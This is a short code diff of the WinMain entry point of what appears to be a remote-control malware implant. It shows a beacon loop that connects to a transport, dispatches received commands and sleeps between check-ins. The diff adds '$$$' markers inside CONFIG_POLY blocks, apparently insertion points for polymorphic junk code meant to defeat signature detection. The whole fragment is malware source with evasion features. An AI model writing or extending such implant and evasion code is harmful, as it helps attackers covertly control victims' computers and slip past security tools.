@@ -17,21 +17,31 @@ INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLin
     morphModule();
 
     RevntInit();
+#if CONFIG_POLY
     $$$
+#endif
     do
     {
         if ( ! Instance.Session.Connected )
         {
             if ( TransportInit( ) )
+#if CONFIG_POLY
                 $$$
+#endif
                 CommandDispatcher();
-                $$$
+#if CONFIG_POLY
+            $$$
+#endif
         }
 
         // Instance->Win32.WaitForSingleObjectEx( NtCurrentThread(), Instance->Config.Sleeping * 1000, FALSE );
+#if CONFIG_POLY
         $$$
+#endif
         Sleep( Instance.Config.Sleeping * 1000 );
+#if CONFIG_POLY
         $$$
+#endif
     } while ( TRUE );
 }
 #pragma clang diagnostic pop
